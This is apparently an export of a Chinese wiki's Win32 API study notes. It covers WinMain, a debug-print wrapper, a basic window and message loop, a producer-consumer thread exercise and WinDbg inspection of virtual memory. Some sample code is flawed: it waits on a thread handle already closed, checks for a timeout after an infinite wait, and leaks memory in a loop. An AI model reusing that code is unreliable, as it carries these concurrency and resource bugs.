Microsoft Learn答案就是a，f，数字键盘7（上图OD的注释是按ASCII码注释的，所以写成了“g”）a-0x41-f65f-0x46-70数字键盘7-0x67-af"},{"title":"第一个窗口程序","path":"/wiki/Windows_API/第一个窗口程序.html","content":"入口函数 控制台程序的入口函数是main函数，在win32程序中，入口函数是WinMain。 123456int APIENTRY WinMain( [in] HINSTANCE hInstance, // handle to current instance [in, optional] HINSTANCE hPrevInstance, // handle to previous instance [in] LPSTR lpCmdLine, // command line [in] int nShowCmd // show state); hInstance：该句柄是当前模块在进程空间中的首地址（加载到内存时的基地址ImageBase） A handle to the current instance of the application.应用程序当前实例的句柄 个人理解：内核对象在0环，出于安全考虑，不会直接给内核地址给应用层，而是句柄表中的一个编号（Handle） 这个模块的基地址在3环，没再套一个编号，hInstance直接就是3环的这个地址 hPrevInstance：永远为NULL，不用理解。有需要未来在查MSDN lpCmdLine：启动这个程序时的命令行参数 nShowCmd：Controls how the window is to be shown. This parameter can be any of the values that can be specified in the nCmdShow parameter for the ShowWindow function. 任何进程都是由父进程创建的，这个win32是个程序，它的lpCmdLine和nShowCmd由CreateProcess函数中的lpCommandLine和lpStartupInfo参数来传递 123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, // LPWSTR lpCommandLine, // 命令行参数 LPSECURITY_ATTRIBUTES lpProcessAttributes, // LPSECURITY_ATTRIBUTES lpThreadAttributes, // BOOL bInheritHandles, // DWORD dwCreationFlags, // LPVOID lpEnvironment, // LPCWSTR lpCurrentDirectory, // LPSTARTUPINFOW lpStartupInfo, // 启动信息 LPPROCESS_INFORMATION lpProcessInformation //); 打印hInstance的值（当前模块的内存地址）来看一下 在win32程序中想要输出信息没法使用printf（没控制台了），可以使用OutputDebugString函数 123void OutputDebugString( LPCTSTR lpOutputString); 但OutputDebugString只能打印固定字符，没法做到printf那样对字符串进行格式化。如果要格式化，要先用sprintf函数进行格式化。 12345678910111213141516#include &lt;Windows.h&gt;#include &lt;stdio.h&gt; //sprintfint APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DWORD dwAddr = (DWORD)hInstance; char szOutBuff[0x80]; sprintf(szOutBuff, &quot;hInstance address: %x &quot;, dwAddr); OutputDebugString(szOutBuff); return 0;&#125; 运行，在xp系统下这个win32模块的内存地址是0x400000 在VC6的工具-设置-链接，分类：输出，修改基地址为5242880（对应0x500000），编译再次运行，输出是500000。说明hInstance（当前模块的内存地址）就是ImageBase 自己封装一个变参输出函数在win32程序中打印信息 在win32程序下没有控制台，没法用printf输出。OutputDebugString可以打印固定字符，但没法变参。可以自己封装一个 OutputDebugStringF.h1234567891011121314#pragma once#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdarg.h&gt;#pragma warning(disable : 4996)void __cdecl OutputDebugStringF(const char* format, ...);#ifdef _DEBUG #define DbgPrintf OutputDebugStringF #else #define DbgPrintf(...) ((void)0)#endif OutputDebugStringF.cpp12345678910111213141516#include &quot;OutputDebugStringF.h&quot;void __cdecl OutputDebugStringF(const char* format, ...)&#123; va_list vlArgs; char* strBuffer = (char*)GlobalAlloc(GPTR, 4096); if (!strBuffer) return; va_start(vlArgs, format); _vsnprintf(strBuffer, 4096 - 1, format, vlArgs); va_end(vlArgs); strcat(strBuffer, &quot; &quot;); OutputDebugStringA(strBuffer); GlobalFree(strBuffer);&#125; main.cpp测试程序1234567891011#include &lt;windows.h&gt;#include &quot;OutputDebugStringF.h&quot;int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)&#123; // 测试 DbgPrintf DbgPrintf(&quot;Hello, World!&quot;); DbgPrintf(&quot;这是一个测试: %d + %d = %d&quot;, 2, 3, 2 + 3); return 0;&#125; DEBUG模式Release模式在DEBUG模式下，DbgPrintf被替换成OutputDebugStringF，就是自己封装的函数 在非DEBUG模式下，DbgPrintf都被替换成((void)0) OutputDebugStringF.h123//省略...#else #define DbgPrintf(...) ((void)0) ...是变参，上面这个宏可以接受任意数量的参数，然后都会被替换成((void)0)。 宏替换示例123456DbgPrintf(&quot;Hello, World!&quot;);DbgPrintf(&quot;这是一个测试: %d + %d = %d&quot;, 2, 3, 2 + 3);//都会被替换成((void)0); ((void)0); ((void)0);不会有任何实际的输出或操作发生 OutputDebugStringF.h的另一种写法OutputDebugStringF.h123456789101112#pragma once#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#pragma warning(disable : 4996)void __cdecl OutputDebugStringF(const char* format, ...);#ifdef _DEBUG#define DbgPrintf OutputDebugStringF#else#define DbgPrintf#endif1#define DbgPrintf在非DEBUG模式下，预处理器会将DbgPrintf替换为一个空字符串。宏替换示例123456DbgPrintf(&quot;Hello, World!&quot;);DbgPrintf(&quot;这是一个测试: %d + %d = %d&quot;, 2, 3, 2 + 3);//会被替换成(&quot;Hello, World!&quot;); //无效C语句，啥也不会发生(&quot;这是一个测试: %d + %d = %d&quot;, 2, 3, 2 + 3); //无效C语句，啥也不会发生 第一个窗口程序 创建窗口程序的大致步骤： 定义要创建的窗口是什么样的 创建并显示窗口 接收消息并处理 例 定义要创建的窗口是什么样的 windows提供了注册窗口类，我们定义一个这样的对象，然后填充该对象的成员字段。不用太关注WNDCLASS对象中每个成员的含义。 1WNDCLASS wndClass = &#123;0&#125;; // 创建WNDCLASS窗口类对象，初始化填充为0 wndClass.hbrBackground是画刷类型，强转。 1wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // 窗口背景颜色 窗口的名字 12TCHAR className[] = TEXT(&quot;My First Window&quot;);wndClass.lpszClassName = className; // 窗口类名 wndClass.hInstance是说当前窗口属于哪个进程，这个窗口属于当前进程，填WinMain函数参数hInstance 1wndClass.hInstance = hInstance; // 窗口实例句柄 当用户对窗口操作后，操作系统将这个操作封装成消息，将消息放到相应线程的消息队列中，窗口函数负责处理消息队列中的消息。 1wndClass.lpfnWndProc = WindowProc; // 窗口过程函数 窗口过程函数1234567LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125; 创建并显示窗口 让操作系统能找到刚才定义的窗口对象。 1RegisterClass(&amp;wndClass); // 注册窗口类 窗口位置和窗口大小的单位都是像素 这个窗口是在win32k.sys中画的，画完了返回HWND给应用层用。 123456789101112131415HWND hWnd = CreateWindow(className, // 窗口类名 TEXT(&quot;窗口&quot;), // 窗口标题 WS_OVERLAPPEDWINDOW, // 窗口样式 10, 10, // 窗口位置 相对于父窗口的x坐标和y坐标是什么 600, 300, // 窗口大小 NULL, NULL, // 父窗口句柄和菜单句柄 这个窗口没有父窗口，写空；不需要菜单，写空 hInstance, // 当前应用程序的句柄 NULL); // 附加参数，一般填空char szOutBuff[0x80];if (hWnd == NULL)&#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0;&#125; 显示窗口 1ShowWindow(hWnd, SW_SHOW); // 显示窗口 接收消息并处理 一个线程有了窗口对象后，就有一个消息队列。这个线程可能有很多个窗口对象，所有窗口对象的消息都放到这个消息队列中。 123456BOOL GetMessage( [out] LPMSG lpMsg, // message information [in, optional] HWND hWnd, // handle to window [in] UINT wMsgFilterMin, // first message [in] UINT wMsgFilterMax // lase message); GetMessage后三个参数都是过滤条件。 hWnd：表示要取哪个窗口的消息。NULL表示取所有窗口的消息 wMsgFilterMin和wMsgFilterMax：取哪个范围内的消息 消息队列中没有消息取的话会阻塞。 取到消息后用DispatchMessage来分发函数，分发的目的是为了找到用哪个窗口函数来处理这个消息。 虽然用GetMessage将消息取出来了，但在3环无法处理这个消息，因为并不知道对应的消息处理函数在哪。消息队列中的消息可能是来源该线程下所拥有的任何窗口对象之一。所以需要再次进0环进行区分。因为每个窗口对象的窗口处理函数在窗口对象中描述，而窗口对象在0环。在程序上体现就是GetMessage后需要DispatchMessage进行消息的分发。GetMessage时得到了窗口的句柄，DispatchMessage时根据这个窗口的句柄去找这个窗口对应的窗口处理函数，让这个窗口处理函数处理消息。 123456789101112131415161718192021// 3. 接收消息并处理MSG msg;BOOL bRet;while ((bRet = GetMessage(&amp;msg, // out参数，取出来的消息放MSG里 NULL, // 取所有窗口的消息 0, // 取所有消息 0) // 取所有消息 ) != 0) // 消息循环&#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // 转换消息 DispatchMessage(&amp;msg); // 分发消息 &#125;&#125; 完整程序 Visual Studio123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#pragma warning(disable : 4996)LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow) // 控制窗口显示方式的标志&#123; // 1. 定义要创建的窗口是什么样的 WNDCLASS wndClass = &#123;0&#125;; // 创建WNDCLASS窗口类对象，初始化填充为0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // 窗口背景颜色 TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // 窗口类名 wndClass.hInstance = hInstance; // 窗口实例句柄，窗口属于哪个进程，当前进程就是WinMain函数参数hInstance wndClass.lpfnWndProc = WindowProc; // 窗口过程函数 // 2. 创建并显示窗口 RegisterClass(&amp;wndClass); // 注册窗口类 HWND hWnd = CreateWindow(className, // 窗口类名 TEXT(&quot;窗口&quot;), // 窗口标题 WS_OVERLAPPEDWINDOW, // 窗口样式 10, 10, // 窗口位置 相对于父窗口的x坐标和y坐标是什么 600, 300, // 窗口大小 NULL, NULL, // 父窗口句柄和菜单句柄 这个窗口没有父窗口，写空；不需要菜单，写空 hInstance, // 实例句柄 NULL); // 附加参数 没，填空 char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; ShowWindow(hWnd, SW_SHOW); // 显示窗口 // 3. 接收消息并处理 MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // 消息循环 &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // 翻译消息 DispatchMessage(&amp;msg); // 分发消息 &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125; Windows窗口程序的工作流程 线程与消息队列: 在Windows中，每个进程至少有一个线程。在上面的程序中，没有创建新的线程，所以WinMain函数本身就是一个线程。 每个线程在操作系统的内核（0环）中有一个对应的线程结构体。当线程创建了窗口对象后，它就拥有了一个消息队列。这个消息队列用来接收针对该窗口的消息。 创建窗口对象: 使用CreateWindow函数创建一个窗口对象。这个函数在内核层执行，并创建一个窗口对象，窗口对象中包含一个指向所属线程的引用。 程序中定义了窗口的一些属性（如窗口类名、窗口过程函数、窗口样式等），并RegisterClass注册了窗口类，然后CreateWindow创建了一个窗口实例。 消息的产生与处理: 用户的操作（如点击鼠标或按键）或其他进程通过API发生的事件，都会生成消息。这些消息由操作系统处理，然后被发送到对应窗口的消息队列中。 消息循环通过GetMessage函数从队列中获取消息。TranslateMessage负责对特定消息进行翻译处理，例如将键盘输入转换为字符消息。 DispatchMessage函数根据消息中的窗口句柄HWND找到相应的窗口对象，并调用该窗口对象的窗口过程函数来处理消息。 回调函数与消息处理: DispatchMessage进入内核找到对应的窗口对象后，操作系统回调（回头调用）窗口过程函数（例如WindowProc）来处理消息。callback函数，call me back when 在上面的程序中，WindowProc函数实际上只是调用了默认的窗口处理函数DefWindowProc来处理大多数消息。 GetMessage取消息，一个线程只有一个消息队列，所有窗口对象的消息都在这个消息队列里。GetMessage取消息后没法处理，需要DispatchMessage函数再次进到内核（涉及API调用流程），找到相应的窗口对象（窗口对象中描述了当前窗口的窗口过程函数），后面由操作系统内核调用该窗口窗口过程函数来处理消息。 原始草稿： 进程至少有一个线程，在上面的程序中没有创建新线程，所以main函数就是一个线程，只要是线程，那么在0环就会有一个对应的线程结构体。随后，程序中使用了CreateWindow（在0环）创建了一个窗口对象（指明了窗口过程函数），窗口对象中有个成员标识了所属线程。这个线程有了窗口对象，那么就存在消息队列了。这个队列用于接收消息。用户对窗口的操作，如点击鼠标或按下键盘，其他进程通过API发生的消息，这些消息对象都会由操作系统找到窗口对象，根据窗口对象找到线程，将该消息存储到消息队列中，随后GetMessage从消息队列中取消息，而处理这个消息的回调函数在0环窗口对象的描述信息中（回调函数地址），所以要调用DispatchMessage，DispatchMessage会拿着得到的窗口句柄，进0环找对应的窗口对象，比如是窗口A的句柄，随后调用窗口A的回调函数WindowProc1来处理这个消息。"},{"title":"线程互斥与线程同步问题","path":"/wiki/Windows_API/线程互斥与线程同步问题.html","content":"概念 线程互斥：多个线程需要访问（写，都是读的话不需要）同一个临界资源 线程同步：多个线程访问同一临界资源有先后顺序要求，同步=互斥+有序 复杂线程互斥和同步问题，既要互斥控制，又要同步控制 练习题 界面如下图所示，程序执行流程是这样的： 用户在用户输入框中输入一些字符 点击开始按钮后，有1个生产者线程从用户输入框中从左到右读单个字符出来放到缓冲区1或缓冲区2 缓冲区1和缓冲区2用于给生产者放单个字符，缓冲区只有两种情况，要么为“空”，要么放了一个字符 有3个消费者线程，会从缓冲区1或缓冲区2取字符追加到自己后面的编辑框中（如果缓冲区1和缓冲区2有数据） 一个典型的操作例子是： 用户输入ABCDE12，点击开始按钮 生产者读到字符A，选了一个可用的缓冲区，比如缓冲区1，放入字符后，发信号给消费者 此时3个消费者中任一一个进到临界区，读到缓冲区1这个字符，然后将字符A追加到自己的编辑框中，随后会将缓冲区1置“空”，通知生产者缓冲区为空可以继续来生产。 过程 1个生产者，2个缓冲区，4个消费者 要用信号量，表示可用资源数，将信号量直接理解为通知，信号量比事件多了数量，仅此而已。 当生产者生产后，通知消费者进行消费（g_hSemaphoreFull+1） 当消费者消费后，通知生产者进行生产（g_hSemaphoreEmpty+1） 进入临界区时，消费者之间的互斥关系 这里是多个Buffer，如果想生产者往缓冲区1生产，消费者在缓冲区2消费。 对于每个缓冲区，需要：2个信号量+1把互斥锁。 这里直接用1把锁将两个缓冲区锁一块了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176#include &lt;Windows.h&gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);DWORD WINAPI ProducerThreadProc(LPVOID lpParameter);DWORD WINAPI ConsumerThreadProc(LPVOID lpParameter);HWND g_hEditInput = NULL; //用户输入编辑框const BYTE BUFFER_COUNT = 2; //缓冲区编辑框HWND g_hEditBuffer[BUFFER_COUNT];BOOL g_BufferIsEmpty[2]; //TRUE：为空 FALSE：满const BYTE CONSUMER_COUNT = 3; //消费者编辑框HWND g_hEditConsumer[CONSUMER_COUNT];HANDLE g_hSemaphoreEmpty = NULL;HANDLE g_hSemaphoreFull = NULL;CRITICAL_SECTION g_cs;int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG_MAIN), NULL, DialogProc ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)&#123; switch (uMsg) &#123; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_INITDIALOG: &#123; g_hEditInput = GetDlgItem(hwndDlg, IDC_EDIT_INPUT); g_hEditBuffer[0] = GetDlgItem(hwndDlg, IDC_EDIT_BUFFER1); g_hEditBuffer[1] = GetDlgItem(hwndDlg, IDC_EDIT_BUFFER2); g_hEditConsumer[0] = GetDlgItem(hwndDlg, IDC_EDIT_CONSUMER1); g_hEditConsumer[1] = GetDlgItem(hwndDlg, IDC_EDIT_CONSUMER2); g_hEditConsumer[2] = GetDlgItem(hwndDlg, IDC_EDIT_CONSUMER3); SetWindowText(g_hEditBuffer[0], &quot;空&quot;); SetWindowText(g_hEditBuffer[1], &quot;空&quot;); g_BufferIsEmpty[0] = TRUE; g_BufferIsEmpty[1] = TRUE; return TRUE; &#125; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case IDC_BUTTON_START: HANDLE hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL); CloseHandle(hWorkerThread); return TRUE; &#125; break; &#125; return FALSE;&#125;DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; g_hSemaphoreEmpty = CreateSemaphore(NULL, BUFFER_COUNT, BUFFER_COUNT, NULL); //初始时生产者可生产两次 g_hSemaphoreFull = CreateSemaphore(NULL, 0, BUFFER_COUNT, NULL); //消费者没资源可以消费 InitializeCriticalSection(&amp;g_cs); //生产者线程 HANDLE hProducerThread = CreateThread(NULL, 0, ProducerThreadProc, g_hEditInput, 0, NULL); CloseHandle(hProducerThread); //消费者线程 HANDLE hConsumerThreads[CONSUMER_COUNT] = &#123; NULL &#125;; for (int i = 0; i &lt; CONSUMER_COUNT; i++) &#123; hConsumerThreads[i] = CreateThread(NULL, 0, ConsumerThreadProc, g_hEditConsumer[i], 0, NULL); &#125; //WaitForSingleObject(hProducerThread, INFINITE); WaitForMultipleObjects(CONSUMER_COUNT, hConsumerThreads, TRUE, INFINITE); for (int i = 0; i &lt; CONSUMER_COUNT; i++) &#123; CloseHandle(hConsumerThreads[i]); &#125; CloseHandle(g_hSemaphoreEmpty); CloseHandle(g_hSemaphoreFull); DeleteCriticalSection(&amp;g_cs); return 0;&#125;DWORD WINAPI ProducerThreadProc(LPVOID lpParameter)&#123; HWND hEditInput = (HWND)lpParameter; //编辑框-用户输入 //得到用户输入框里的内容 char szInputBuffer[20] = &#123; 0 &#125;; GetWindowText(hEditInput, szInputBuffer, 20); for (int i = 0; i &lt; strlen(szInputBuffer); i++) //遍历每个字符 &#123; WaitForSingleObject(g_hSemaphoreEmpty, INFINITE); EnterCriticalSection(&amp;g_cs); for (int j = 0; j &lt; BUFFER_COUNT; j++) //找空的缓冲区 &#123; if (g_BufferIsEmpty[j]) //缓冲区为空，可放入数据 &#123; char szTemp[2] = &#123; szInputBuffer[i], 0 &#125;; SetWindowText(g_hEditBuffer[j], szTemp); g_BufferIsEmpty[j] = FALSE; //标记缓冲区满 Sleep(500); //方便观察 break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreFull, 1, NULL); &#125; return 0;&#125;DWORD WINAPI ConsumerThreadProc(LPVOID lpParameter)&#123; HWND hEditConsumer = (HWND)lpParameter; while (TRUE) &#123; // 等待信号，有信号后开始进入临界区，从缓冲区中取字符 WaitForSingleObject(g_hSemaphoreFull, INFINITE); EnterCriticalSection(&amp;g_cs); for (int i = 0; i &lt; BUFFER_COUNT; i++) &#123; if (!g_BufferIsEmpty[i]) &#123; // 得到缓冲区中的字符 char szTemp[2] = &#123; 0 &#125;; GetWindowText(g_hEditBuffer[i], szTemp, 2); // 拼接字符串到消费者编辑框中 char szConsumerText[256] = &#123; 0 &#125;; GetWindowText(hEditConsumer, szConsumerText, 256); strcat_s(szConsumerText, szTemp); SetWindowText(hEditConsumer, szConsumerText); // 缓冲区置空 SetWindowText(g_hEditBuffer[i], &quot;空&quot;); g_BufferIsEmpty[i] = TRUE; break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreEmpty, 1, NULL); Sleep(1000); //方便观察 &#125; return 0;&#125; 消费者线程何时退出上面的代码还是有点问题，消费者线程一直在循环中，没有退出的机会。有三种方法来结束消费者线程：使用一个全局的标记变量表示生产者线程是否还在生产。当生产者线程结束时，修改这个标记变量，消费者线程根据这个变量决定是否继续运行。消费者线程等待信号量时加个时间，如果等待超时了，认为生产者不再生产，消费者线程就退出。（这个方式好些，就是WaitForSingleObject加个等待超时）使用事件对象来通知所有消费者线程在生产者线程结束后退出。方法一：标记变量方法二：等待超时方法三：再用个事件对象12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667volatile BOOL g_bIsProducing = TRUE; // 全局标记变量DWORD WINAPI ProducerThreadProc(LPVOID lpParameter)&#123; HWND hEditInput = (HWND)lpParameter; char szInputBuffer[20] = &#123; 0 &#125;; GetWindowText(hEditInput, szInputBuffer, 20); for (int i = 0; i &lt; strlen(szInputBuffer); i++) &#123; WaitForSingleObject(g_hSemaphoreEmpty, INFINITE); EnterCriticalSection(&amp;g_cs); for (int j = 0; j &lt; BUFFER_COUNT; j++) &#123; if (g_BufferIsEmpty[j]) &#123; char szTemp[2] = &#123; szInputBuffer[i], 0 &#125;; SetWindowText(g_hEditBuffer[j], szTemp); g_BufferIsEmpty[j] = FALSE; Sleep(500); break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreFull, 1, NULL); &#125; g_bIsProducing = FALSE; // 生产者线程结束，修改标记变量 return 0;&#125;DWORD WINAPI ConsumerThreadProc(LPVOID lpParameter)&#123; HWND hEditConsumer = (HWND)lpParameter; while (g_bIsProducing || WaitForSingleObject(g_hSemaphoreFull, 0) == WAIT_OBJECT_0) &#123; if (WaitForSingleObject(g_hSemaphoreFull, INFINITE) == WAIT_TIMEOUT) &#123; continue; &#125; EnterCriticalSection(&amp;g_cs); for (int i = 0; i &lt; BUFFER_COUNT; i++) &#123; if (!g_BufferIsEmpty[i]) &#123; char szTemp[2] = &#123; 0 &#125;; GetWindowText(g_hEditBuffer[i], szTemp, 2); char szConsumerText[256] = &#123; 0 &#125;; GetWindowText(hEditConsumer, szConsumerText, 256); strcat_s(szConsumerText, szTemp); SetWindowText(hEditConsumer, szConsumerText); SetWindowText(g_hEditBuffer[i], &quot;空&quot;); g_BufferIsEmpty[i] = TRUE; break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreEmpty, 1, NULL); Sleep(1000); &#125; return 0;&#125;1234567891011121314151617181920212223242526272829303132333435363738#define CONSUMER_TIMEOUT 5000 // 超时时间5秒DWORD WINAPI ConsumerThreadProc(LPVOID lpParameter)&#123; HWND hEditConsumer = (HWND)lpParameter; while (TRUE) &#123; if (WaitForSingleObject(g_hSemaphoreFull, CONSUMER_TIMEOUT) == WAIT_TIMEOUT) &#123; break; // 超时，退出线程 &#125; EnterCriticalSection(&amp;g_cs); for (int i = 0; i &lt; BUFFER_COUNT; i++) &#123; if (!g_BufferIsEmpty[i]) &#123; char szTemp[2] = &#123; 0 &#125;; GetWindowText(g_hEditBuffer[i], szTemp, 2); char szConsumerText[256] = &#123; 0 &#125;; GetWindowText(hEditConsumer, szConsumerText, 256); strcat_s(szConsumerText, szTemp); SetWindowText(hEditConsumer, szConsumerText); SetWindowText(g_hEditBuffer[i], &quot;空&quot;); g_BufferIsEmpty[i] = TRUE; break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreEmpty, 1, NULL); Sleep(1000); &#125; return 0;&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172HANDLE g_hEventStop = NULL; // 全局事件对象DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; g_hSemaphoreEmpty = CreateSemaphore(NULL, BUFFER_COUNT, BUFFER_COUNT, NULL); g_hSemaphoreFull = CreateSemaphore(NULL, 0, BUFFER_COUNT, NULL); g_hEventStop = CreateEvent(NULL, TRUE, FALSE, NULL); InitializeCriticalSection(&amp;g_cs); HANDLE hProducerThread = CreateThread(NULL, 0, ProducerThreadProc, g_hEditInput, 0, NULL); CloseHandle(hProducerThread); HANDLE hConsumerThreads[CONSUMER_COUNT] = &#123; NULL &#125;; for (int i = 0; i &lt; CONSUMER_COUNT; i++) &#123; hConsumerThreads[i] = CreateThread(NULL, 0, ConsumerThreadProc, g_hEditConsumer[i], 0, NULL); &#125; WaitForSingleObject(hProducerThread, INFINITE); SetEvent(g_hEventStop); // 通知所有消费者线程停止 WaitForMultipleObjects(CONSUMER_COUNT, hConsumerThreads, TRUE, INFINITE); for (int i = 0; i &lt; CONSUMER_COUNT; i++) &#123; CloseHandle(hConsumerThreads[i]); &#125; CloseHandle(g_hSemaphoreEmpty); CloseHandle(g_hSemaphoreFull); CloseHandle(g_hEventStop); DeleteCriticalSection(&amp;g_cs); return 0;&#125;DWORD WINAPI ConsumerThreadProc(LPVOID lpParameter)&#123; HWND hEditConsumer = (HWND)lpParameter; while (TRUE) &#123; DWORD dwWaitResult = WaitForMultipleObjects(2, new HANDLE[2]&#123; g_hSemaphoreFull, g_hEventStop &#125;, FALSE, INFINITE); if (dwWaitResult == WAIT_OBJECT_0 + 1) &#123; break; // 收到停止事件，退出线程 &#125; EnterCriticalSection(&amp;g_cs); for (int i = 0; i &lt; BUFFER_COUNT; i++) &#123; if (!g_BufferIsEmpty[i]) &#123; char szTemp[2] = &#123; 0 &#125;; GetWindowText(g_hEditBuffer[i], szTemp, 2); char szConsumerText[256] = &#123; 0 &#125;; GetWindowText(hEditConsumer, szConsumerText, 256); strcat_s(szConsumerText, szTemp); SetWindowText(hEditConsumer, szConsumerText); SetWindowText(g_hEditBuffer[i], &quot;空&quot;); g_BufferIsEmpty[i] = TRUE; break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreEmpty, 1, NULL); Sleep(1000); &#125; return 0;&#125;"},{"title":"虚拟内存与物理内存","path":"/wiki/Windows_API/虚拟内存与物理内存.html","content":"前言 学习内存管理相关的api前需要了解本节的知识内容。 虚拟内存与物理内存的关系 每个进程都有自己独立的4GB空间，上面的内存地址叫线性地址。这块内存是假的虚拟内存，不是真实存在的内存。只有这个虚拟内存真正使用时操作系统才会对这个虚拟地址挂上物理页，未使用的虚拟内存肯定就没挂物理页。 物理内存是操作系统抽象出来的内存，它离真正的内存条之间还有一层电路转换，但这个过于底层。我们了解到物理内存这一层即可。 MMU负责将进程的虚拟地址转换为物理内存地址。 A进程在003A000地址存了一个值10，B进程在003A000地址存了一个值20。进程A和进程B的CR3不同，所以进程A的线性地址003A000和进程B的线性地址003A000最后转成的物理内存地址是不同的。 虚拟内存地址划分 每个进程都有自己独立的4GB虚拟内存空间。低2G为用户空间，进程可以使用的空间；高2G是内核空间，所有进程共享的空间。在低2G的用户空间中，还有前64KB的空指针赋值区和后64KB的用户禁入区不能使用（没挂物理页）。所以一个进程能用的虚拟内存空间只有0x00010000-0x7FFEFFFF这块空间。这是能使用的部分，但只有真正使用了才会挂物理页。 地址（x86 32位windows） 分区 0x00000000-0x0000FFFF 空指针赋值区 0x00010000-0x7FFEFFFF 用户模式区 0x7FFF0000-0x7FFFFFFF 64KB禁入区 0x80000000-0xFFFFFFFF 内核 实验：查看一个进程用户模式区中线性地址的使用情况 用windbg对xp系统双机调试，在xp系统中打开一个notepad，windbg下断 列出系统中所有进程信息1!process 0 0 123PROCESS 860ba438 SessionId: 0 Cid: 05bc Peb: 7ffd7000 ParentCid: 0738 DirBase: 0d5801c0 ObjectTable: e209d300 HandleCount: 44. Image: notepad.exe 显示内存地址860ba438处_EPROCESS结构体的内容1dt _EPROCESS 860ba438 VAD树是操作系统用来追踪进程虚拟地址空间的一种结构 显示地址0x862edf08处VAD节点的信息1!vad 0x862edf08 物理内存以页4KB为单位，start和end的单位是页，比如第一行 12VAD level start end commit860c4858 ( 3) 10 10 1 Private READWRITE 表示的就是0x10-0x10这一个4KB的页，线性地址是0x10000-0x1000（乘上页的单位4KB，1000h或4096十进制） 线性地址0x00001000-0x00001000被占用； 线性地址0x00002000-0x00002000被占用； …； 线性地址0x00100000-0x00101000被占用，用于存储记事本程序的代码或数据。 中间空挡的线性地址就是没使用的线性地址。 解读输出的VAD节点信息VAD：这是VAD节点的内存地址。Level：VAD树的层级深度，表示该节点在树中的位置。Start 和 End：这两列显示了由该VAD节点管理的虚拟内存区域的起始和结束地址。Commit：这表示已提交的页面数。对于Private类型的区域，这是实际分配给该区域的物理内存页面数。对于Mapped类型的区域，该值通常为零，因为它们映射到文件，而不是物理内存。类型：VAD可以是以下几种类型之一：Private：私有内存区域，通常用于存储进程特有的数据。Mapped：映射内存区域，通常关联到某个文件。例如，映射到可执行文件的区域会以“Mapped Exe”表示。保护：显示内存区域的访问权限，如 READWRITE 表示可读写的内存区域。特别描述：对于映射内存，这一列可能包含了映射源的文件路径，例如 \\WINDOWS\\system32 otepad.exe。对于私有内存，这一列通常为空。例如，地址 1000 到 1012 的区域被映射为 notepad.exe，表示这部分内存区域用于存储记事本程序的代码或数据。 物理内存 可供使用的物理内存 Intel架构处理器以4KB为最小单位（页，Page）来管理物理页。一台电脑上可供使用的物理内存的大小为 